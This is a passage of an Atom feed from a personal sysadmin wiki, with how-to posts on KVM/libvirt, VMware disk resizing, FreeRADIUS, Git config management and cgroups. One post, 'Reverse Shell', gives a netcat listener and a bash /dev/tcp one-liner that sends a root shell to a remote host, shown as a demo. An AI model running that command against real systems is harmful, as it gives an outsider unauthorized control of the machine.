&lt;span class="go"&gt;[SOL Session operational. Use ~? for help]&lt;/span&gt;

&lt;span class="go"&gt;Debian GNU/Linux 7 node-05 ttyS2&lt;/span&gt;

&lt;span class="go"&gt;node-05 login:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://wiki.hetzner.de/index.php/IPMI/en#Serial_over_LAN"&gt;http://wiki.hetzner.de/index.php/IPMI/en#Serial_over_LAN&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="drac"></category><category term="ilo"></category><category term="ipmi"></category><category term="sol"></category></entry><entry><title>a CentOS within a CentOS - virtualization with kvm and libvirt</title><link href="http://wiki.jokeru.ro/how-to-a-centos-within-a-centos-virtualization-with-kvm-and-libvirt.html" rel="alternate"></link><published>2015-07-23T14:41:00+01:00</published><updated>2015-07-23T14:41:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-07-23:/how-to-a-centos-within-a-centos-virtualization-with-kvm-and-libvirt.html</id><summary type="html">&lt;p&gt;This post will give you a quick intro into the basics of Kernel based Virtual Machine (&lt;a href="http://www.linux-kvm.org/page/Main_Page"&gt;KVM&lt;/a&gt;) in CentOS / RedHat.
Bellow you have a step-by-step procedure on how to to get a CentOS VM running inside a CentOS host.&lt;/p&gt;
&lt;h4&gt;Install and start the services:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; uname -a
&lt;span class="go"&gt;Linux centos 2.6 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;This post will give you a quick intro into the basics of Kernel based Virtual Machine (&lt;a href="http://www.linux-kvm.org/page/Main_Page"&gt;KVM&lt;/a&gt;) in CentOS / RedHat.
Bellow you have a step-by-step procedure on how to to get a CentOS VM running inside a CentOS host.&lt;/p&gt;
&lt;h4&gt;Install and start the services:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; uname -a
&lt;span class="go"&gt;Linux centos 2.6.32-504.12.2.el6.x86_64 #1 SMP Wed Mar 11 22:03:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; egrep -c &lt;span class="s1"&gt;&amp;#39;(vmx|svm)&amp;#39;&lt;/span&gt; /proc/cpuinfo
&lt;span class="go"&gt;4&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; yum install kvm qemu-kvm &lt;span class="c1"&gt;# kvm kernel module and qemu hosted (type 2) hypervisor&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; yum install libvirt libvirt-python python-virtinst &lt;span class="c1"&gt;# kvm manager&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; optional packages
&lt;span class="gp"&gt;$&lt;/span&gt; yum install libguestfs-tools &lt;span class="c1"&gt;# tools for accessing and modifying virtual machine disk images&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; start the libvirt virtualization management system server daemon
&lt;span class="gp"&gt;$&lt;/span&gt; chkconfig libvirtd on
&lt;span class="gp"&gt;$&lt;/span&gt; service libvirtd start &lt;span class="c1"&gt;# be sure your hostname resolves correctly to avoid any warnings&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service libvirtd status
&lt;span class="gp"&gt;$&lt;/span&gt; virsh -c qemu:///system list
&lt;span class="go"&gt;Id Name State&lt;/span&gt;
&lt;span class="go"&gt;----------------------------------------------------&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The default virtual network configuration is known as Usermode Networking.
Traffic is NATed through the host interface to the outside network.&lt;/p&gt;
&lt;p&gt;Alternately, you can configure Bridged Networking to enable external hosts to directly access services on the guest operating system.&lt;/p&gt;
&lt;h4&gt;I'll use the second option for this demo:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; disable the Usermode Networking
&lt;span class="gp"&gt;$&lt;/span&gt; virsh net-list
&lt;span class="go"&gt;Name State Autostart Persistent&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;default active yes yes&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; virsh net-destroy default
&lt;span class="go"&gt;Network default destroyed&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; virsh net-undefine default
&lt;span class="go"&gt;Network default has been undefined&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; virsh net-list
&lt;span class="go"&gt;Name State Autostart Persistent&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; service libvirtd restart &lt;span class="c1"&gt;# for safety&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;enable&lt;/span&gt; Bridged Networking on eth1 &lt;span class="o"&gt;(&lt;/span&gt;eth0 will remain &lt;span class="k"&gt;for&lt;/span&gt; host traffic&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; yum install bridge-utils
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;EOF &amp;gt; /etc/sysconfig/network-scripts/ifcfg-eth1
&lt;span class="go"&gt;DEVICE=eth1&lt;/span&gt;
&lt;span class="go"&gt;TYPE=Ethernet&lt;/span&gt;
&lt;span class="go"&gt;ONBOOT=yes&lt;/span&gt;
&lt;span class="go"&gt;BRIDGE=br1&lt;/span&gt;
&lt;span class="go"&gt;IPV6INIT=no&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;EOF &amp;gt; /etc/sysconfig/network-scripts/ifcfg-br1
&lt;span class="go"&gt;DEVICE=br1&lt;/span&gt;
&lt;span class="go"&gt;TYPE=Bridge&lt;/span&gt;
&lt;span class="go"&gt;ONBOOT=yes&lt;/span&gt;
&lt;span class="go"&gt;BOOTPROTO=none&lt;/span&gt;
&lt;span class="go"&gt;IPV6INIT=no&lt;/span&gt;
&lt;span class="go"&gt;DELAY=0&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/network restart
&lt;span class="gp"&gt;$&lt;/span&gt; brctl show
&lt;span class="go"&gt;bridge name bridge id STP enabled interfaces&lt;/span&gt;
&lt;span class="go"&gt;br1 8000.001a6496addf no eth1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Let's get the CentOS ISO image and mount it to be used by the install process:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /var/lib/libvirt/boot/
&lt;span class="gp"&gt;$&lt;/span&gt; wget &lt;span class="s2"&gt;&amp;quot;http://ftp.ines.lug.ro/centos/6.6/isos/x86_64/CentOS-6.6-x86_64-netinstall.iso&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /mnt/centos66/
&lt;span class="gp"&gt;$&lt;/span&gt; mount -o loop /var/lib/libvirt/boot/CentOS-6.6-x86_64-netinstall.iso /mnt/centos66/
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;And create the VM:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; virt-install &lt;span class="se"&gt;\&lt;/span&gt;
--connect qemu:///system &lt;span class="se"&gt;\&lt;/span&gt;
--name flash &lt;span class="se"&gt;\&lt;/span&gt;
--description &lt;span class="s2"&gt;&amp;quot;Flash VM&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--hvm &lt;span class="se"&gt;\&lt;/span&gt;
--accelerate &lt;span class="se"&gt;\&lt;/span&gt;
--ram &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--vcpus &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--cpuset &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--numatune &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--cpu host &lt;span class="se"&gt;\&lt;/span&gt;
--location /mnt/centos66 &lt;span class="se"&gt;\&lt;/span&gt;
--os-type linux &lt;span class="se"&gt;\&lt;/span&gt;
--os-variant rhel6 &lt;span class="se"&gt;\&lt;/span&gt;
--disk &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/lib/libvirt/images/flash.img,bus&lt;span class="o"&gt;=&lt;/span&gt;virtio,size&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;,sparse&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
--network bridge:br1,model&lt;span class="o"&gt;=&lt;/span&gt;virtio &lt;span class="se"&gt;\&lt;/span&gt;
--graphics none &lt;span class="se"&gt;\&lt;/span&gt;
--extra-args&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;console=tty0 console=ttyS0,115200&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Some useful management commands:&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;virsh list&lt;/span&gt;
&lt;span class="go"&gt;virsh list --all&lt;/span&gt;

&lt;span class="go"&gt;virsh dominfo flash&lt;/span&gt;
&lt;span class="go"&gt;virsh dumpxml flash&lt;/span&gt;
&lt;span class="go"&gt;virsh edit flash&lt;/span&gt;

&lt;span class="go"&gt;virsh console flash&lt;/span&gt;
&lt;span class="go"&gt;virsh suspend flash&lt;/span&gt;
&lt;span class="go"&gt;virsh resume flash&lt;/span&gt;
&lt;span class="go"&gt;virsh shutdown flash # you need acpid inside the guest for this command to work&lt;/span&gt;
&lt;span class="go"&gt;virsh start flash&lt;/span&gt;
&lt;span class="go"&gt;virsh reboot flash # you need acpid inside the guest for this command to work&lt;/span&gt;
&lt;span class="go"&gt;virsh destroy flash # ungraceful shutdown (can corrupt guest filesystems)&lt;/span&gt;
&lt;span class="go"&gt;virsh autostart flash&lt;/span&gt;
&lt;span class="go"&gt;virsh autostart --disable flash&lt;/span&gt;
&lt;span class="go"&gt;virsh undefine flash # deletes all files associated with this guest&lt;/span&gt;

&lt;span class="go"&gt;virt-clone --connect qemu:///system --original flash --name flash-copy --file /var/lib/libvirt/images/flash-copy.img&lt;/span&gt;

&lt;span class="go"&gt;virt-top&lt;/span&gt;
&lt;span class="go"&gt;virt-df&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://www.cyberciti.biz/faq/kvm-virtualization-in-redhat-centos-scientific-linux-6/"&gt;http://www.cyberciti.biz/faq/kvm-virtualization-in-redhat-centos-scientific-linux-6/&lt;/a&gt;&lt;br&gt;
&lt;a href="http://linux.dell.com/files/whitepapers/KVM_Virtualization_in_RHEL_6_made_easy.pdf"&gt;http://linux.dell.com/files/whitepapers/KVM_Virtualization_in_RHEL_6_made_easy.pdf&lt;/a&gt;&lt;br&gt;
&lt;a href="http://linux.dell.com/files/whitepapers/KVM_Virtualization_in_RHEL_6_Made_Easy_Part2.pdf"&gt;http://linux.dell.com/files/whitepapers/KVM_Virtualization_in_RHEL_6_Made_Easy_Part2.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="centos"></category><category term="kvm"></category><category term="libvirt"></category></entry><entry><title>Increase VM disk capacity</title><link href="http://wiki.jokeru.ro/how-to-increase-vm-disk-capacity.html" rel="alternate"></link><published>2015-07-17T12:00:00+01:00</published><updated>2015-07-17T12:00:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-07-17:/how-to-increase-vm-disk-capacity.html</id><summary type="html">&lt;p&gt;Ever needed a bigger disk (not for root) inside your Guest OS (powered by VMware)?
Look no further, I have the answer.&lt;/p&gt;
&lt;p&gt;You don't need to stop the guest, this operation is done on a running VM.&lt;/p&gt;
&lt;p&gt;Login on you vCenter, edit the VM's settings, increase disk size to the …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ever needed a bigger disk (not for root) inside your Guest OS (powered by VMware)?
Look no further, I have the answer.&lt;/p&gt;
&lt;p&gt;You don't need to stop the guest, this operation is done on a running VM.&lt;/p&gt;
&lt;p&gt;Login on you vCenter, edit the VM's settings, increase disk size to the needed value.
That's it on the virtualization layer.&lt;/p&gt;
&lt;h4&gt;Now let's update the guest also:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; stop all services that need access to that disk / mount

&lt;span class="gp"&gt;#&lt;/span&gt; re-read the new disk geometry
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /sys/class/scsi_disk
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="se"&gt;\:&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="se"&gt;\:&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="se"&gt;\:&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;/device/rescan

&lt;span class="gp"&gt;#&lt;/span&gt; increase the partition size - don&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t worry, no data will be lost, only the partition table will be recreated
&lt;span class="gp"&gt;$&lt;/span&gt; umount /dev/sdb1
&lt;span class="gp"&gt;$&lt;/span&gt; parted /dev/sdb print fix fix
&lt;span class="gp"&gt;$&lt;/span&gt; parted /dev/sdb --script -- rm &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; parted /dev/sdb --script -- mkpart primary &lt;span class="m"&gt;1&lt;/span&gt; -1

&lt;span class="gp"&gt;#&lt;/span&gt; increase the filesystem size
&lt;span class="gp"&gt;$&lt;/span&gt; e2fsck -f /dev/sdb1
&lt;span class="gp"&gt;$&lt;/span&gt; resize2fs /dev/sdb1
&lt;span class="gp"&gt;$&lt;/span&gt; mount /dev/sdb1
&lt;/pre&gt;&lt;/div&gt;</content><category term="disk"></category><category term="increase"></category><category term="tuning"></category><category term="vmware"></category></entry><entry><title>FreeRADIUS basics</title><link href="http://wiki.jokeru.ro/how-to-freeradius-basics.html" rel="alternate"></link><published>2015-07-08T23:55:00+01:00</published><updated>2015-07-08T23:55:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-07-08:/how-to-freeradius-basics.html</id><summary type="html">&lt;p&gt;While playing around with &lt;a href="https://www.softether.org/"&gt;SoftEther&lt;/a&gt;, one of the authentication options was Radius.&lt;/p&gt;
&lt;h4&gt;So let's setup a radius server:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; install server  
&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install freeradius -y
&lt;span class="gp"&gt;#&lt;/span&gt; create a user
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;test Cleartext-Password := &amp;quot;test&amp;quot;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/freeradius/users
&lt;span class="gp"&gt;#&lt;/span&gt; no need to add clients, localhost is allowed by default
&lt;span class="gp"&gt;$&lt;/span&gt; touch /etc/freeradius/clients.conf
&lt;span class="gp"&gt;#&lt;/span&gt; apply …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;While playing around with &lt;a href="https://www.softether.org/"&gt;SoftEther&lt;/a&gt;, one of the authentication options was Radius.&lt;/p&gt;
&lt;h4&gt;So let's setup a radius server:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; install server  
&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install freeradius -y
&lt;span class="gp"&gt;#&lt;/span&gt; create a user
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;test Cleartext-Password := &amp;quot;test&amp;quot;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/freeradius/users
&lt;span class="gp"&gt;#&lt;/span&gt; no need to add clients, localhost is allowed by default
&lt;span class="gp"&gt;$&lt;/span&gt; touch /etc/freeradius/clients.conf
&lt;span class="gp"&gt;#&lt;/span&gt; apply the configuration
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/freeradius restart

&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; a successful login
&lt;span class="gp"&gt;$&lt;/span&gt; radtest &lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; localhost &lt;span class="m"&gt;0&lt;/span&gt; testing123
&lt;span class="go"&gt;Sending Access-Request of id 138 to 127.0.0.1 port 1812&lt;/span&gt;
&lt;span class="go"&gt;User-Name = &amp;quot;test&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;User-Password = &amp;quot;test&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;NAS-IP-Address = 10.20.30.40&lt;/span&gt;
&lt;span class="go"&gt;NAS-Port = 0&lt;/span&gt;
&lt;span class="go"&gt;Message-Authenticator = 0x00000000000000000000000000000000&lt;/span&gt;
&lt;span class="go"&gt;rad_recv: Access-Accept packet from host 127.0.0.1 port 1812, id=138, length=20&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; an invalid login
&lt;span class="gp"&gt;$&lt;/span&gt; radtest badtest badtest localhost &lt;span class="m"&gt;0&lt;/span&gt; testing123
&lt;span class="go"&gt;Sending Access-Request of id 137 to 127.0.0.1 port 1812&lt;/span&gt;
&lt;span class="go"&gt;User-Name = &amp;quot;badtest&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;User-Password = &amp;quot;badtest&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;NAS-IP-Address = 10.20.30.40&lt;/span&gt;
&lt;span class="go"&gt;NAS-Port = 0&lt;/span&gt;
&lt;span class="go"&gt;Message-Authenticator = 0x00000000000000000000000000000000&lt;/span&gt;
&lt;span class="go"&gt;rad_recv: Access-Reject packet from host 127.0.0.1 port 1812, id=137, length=20&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; you can also sniff the traffic to see the requests &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; replies
&lt;span class="gp"&gt;$&lt;/span&gt; tcpdump -ni lo port &lt;span class="m"&gt;1812&lt;/span&gt;
&lt;span class="go"&gt;20:44:44.831310 IP 127.0.0.1.54774 &amp;gt; 127.0.0.1.1812: RADIUS, Access Request (1), id: 0xf4 length: 74&lt;/span&gt;
&lt;span class="go"&gt;20:44:44.831468 IP 127.0.0.1.1812 &amp;gt; 127.0.0.1.54774: RADIUS, Access Accept (2), id: 0xf4 length: 20&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;PS: If you really want to use this in a production / enterprise environment, then you should add the mysql support &lt;code&gt;apt-get install freeradius-mysql&lt;/code&gt;.&lt;/p&gt;</content><category term="auth"></category><category term="freeradius"></category><category term="radius"></category><category term="softether"></category><category term="vpn"></category></entry><entry><title>Reverse Shell</title><link href="http://wiki.jokeru.ro/how-to-reverse-shell.html" rel="alternate"></link><published>2015-07-08T23:25:00+01:00</published><updated>2015-07-08T23:25:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-07-08:/how-to-reverse-shell.html</id><summary type="html">&lt;p&gt;A reverse shell is achieved when you "send" a server's shell (in my demo the server is named &lt;code&gt;target&lt;/code&gt;) to another server (&lt;code&gt;hq&lt;/code&gt; in my setup).&lt;/p&gt;
&lt;p&gt;Using this technique you can run &lt;code&gt;root&lt;/code&gt; commands on a server you aren't connected.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; open up a tcp port on the &lt;span class="s2"&gt;&amp;quot;hq&amp;quot;&lt;/span&gt; server to …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;A reverse shell is achieved when you "send" a server's shell (in my demo the server is named &lt;code&gt;target&lt;/code&gt;) to another server (&lt;code&gt;hq&lt;/code&gt; in my setup).&lt;/p&gt;
&lt;p&gt;Using this technique you can run &lt;code&gt;root&lt;/code&gt; commands on a server you aren't connected.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; open up a tcp port on the &lt;span class="s2"&gt;&amp;quot;hq&amp;quot;&lt;/span&gt; server to &lt;span class="s2"&gt;&amp;quot;receive&amp;quot;&lt;/span&gt; the reverse shell
&lt;span class="gp"&gt;$&lt;/span&gt; nc -n -l -p &lt;span class="m"&gt;60001&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; send the shell from the &lt;span class="s2"&gt;&amp;quot;target&amp;quot;&lt;/span&gt; server to &lt;span class="s2"&gt;&amp;quot;hq&amp;quot;&lt;/span&gt; socket
&lt;span class="gp"&gt;$&lt;/span&gt; nohup /bin/bash &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.20.30.40/60001 &lt;span class="m"&gt;0&lt;/span&gt;&amp;lt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; now on &lt;span class="s2"&gt;&amp;quot;hq&amp;quot;&lt;/span&gt; you can run any &lt;span class="nb"&gt;command&lt;/span&gt;
&lt;span class="go"&gt;hostname # command sent to execution on remote host&lt;/span&gt;
&lt;span class="go"&gt;target # output received from command&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="debian"></category><category term="bash"></category><category term="exploit"></category><category term="hack"></category><category term="reverse shell"></category></entry><entry><title>Git yourself / configuration management server</title><link href="http://wiki.jokeru.ro/how-to-git-yourself-configuration-management-server.html" rel="alternate"></link><published>2015-05-18T15:00:00+01:00</published><updated>2015-05-18T15:00:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-05-18:/how-to-git-yourself-configuration-management-server.html</id><summary type="html">&lt;p&gt;If you don't know what is Git good for, or if you do, I suggest to start with these two pages: &lt;a href="http://rogerdudler.github.io/git-guide/" title="http://rogerdudler.github.io/git-guide/"&gt;http://rogerdudler.github.io/git-guide/&lt;/a&gt; and &lt;a href="https://www.atlassian.com/git/tutorials/setting-up-a-repository" title="https://www.atlassian.com/git/tutorials/setting-up-a-repository"&gt;https://www.atlassian.com/git/tutorials/setting-up-a-repository&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now that everything is clear, we can go on configuring the good stuff:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we'll have a …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;If you don't know what is Git good for, or if you do, I suggest to start with these two pages: &lt;a href="http://rogerdudler.github.io/git-guide/" title="http://rogerdudler.github.io/git-guide/"&gt;http://rogerdudler.github.io/git-guide/&lt;/a&gt; and &lt;a href="https://www.atlassian.com/git/tutorials/setting-up-a-repository" title="https://www.atlassian.com/git/tutorials/setting-up-a-repository"&gt;https://www.atlassian.com/git/tutorials/setting-up-a-repository&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now that everything is clear, we can go on configuring the good stuff:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we'll have a central node that will be the &lt;em&gt;configuration management server / repo&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;and X other client nodes that will push their configuration to the central repo&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;On the central repo:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install git-core
&lt;span class="gp"&gt;#&lt;/span&gt; let&lt;span class="s1"&gt;&amp;#39;s make a git user and not use root for the actual git sync&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="s1"&gt; you can use ssh keys for the git user so you can script your daily / weekly syncs&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="s1"&gt; adduser git&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="s1"&gt; su git&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="s1"&gt; let&amp;#39;&lt;/span&gt;s make the first repo - let&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s take an apache document root as an example
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir node-01.www
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; node-01.www
&lt;span class="gp"&gt;$&lt;/span&gt; git init --bare
&lt;span class="go"&gt;Initialized empty Git repository in /home/git/node-01.www/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;On node-01:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install git-core
&lt;span class="gp"&gt;$&lt;/span&gt; git config --global user.name &lt;span class="s2"&gt;&amp;quot;JoKeru&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; git config --global user.email &lt;span class="s2"&gt;&amp;quot;root@node-01&amp;quot;&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www
&lt;span class="gp"&gt;$&lt;/span&gt; git init
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="c1"&gt;# use .gitignore if you don&amp;#39;t want to sync files / folders (cache, tmp, logs ...)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; git add .
&lt;span class="gp"&gt;$&lt;/span&gt; git status &lt;span class="c1"&gt;# to check files added&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; git commit -m &lt;span class="s2"&gt;&amp;quot;initial commit&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# now the local repo is done&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; git remote add origin ssh://git@git-central:/home/git/node-01.www
&lt;span class="gp"&gt;$&lt;/span&gt; git remote show origin
&lt;span class="gp"&gt;$&lt;/span&gt; git push origin master &lt;span class="c1"&gt;# now the central repo is also updated&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; git remote show origin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you want to retrieve the latest configuration for &lt;code&gt;node-01.www&lt;/code&gt; repo from the central repo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; git clone ssh://git@git-central:/home/git/node-01.www /var/www-from-central-repo
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And finally, i suggest you to install this Git Graphical User Interface on the central repo: &lt;a href="https://github.com/klaussilveira/gitlist" title="https://github.com/klaussilveira/gitlist"&gt;https://github.com/klaussilveira/gitlist&lt;/a&gt;.&lt;/p&gt;</content><category term="configuration management"></category><category term="git"></category><category term="itil"></category><category term="repo"></category></entry><entry><title>cgroups in Debian 6 - a mess</title><link href="http://wiki.jokeru.ro/how-to-cgroups-in-debian-6-a-mess.html" rel="alternate"></link><published>2015-05-08T22:45:00+01:00</published><updated>2015-05-08T22:45:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-05-08:/how-to-cgroups-in-debian-6-a-mess.html</id><summary type="html">&lt;p&gt;Control Groups are good, but the implementation in Debian 6 is a mess!
I know that this OS is not the latest, but when you have production servers, you don't always get the chance to run latest versions.&lt;/p&gt;
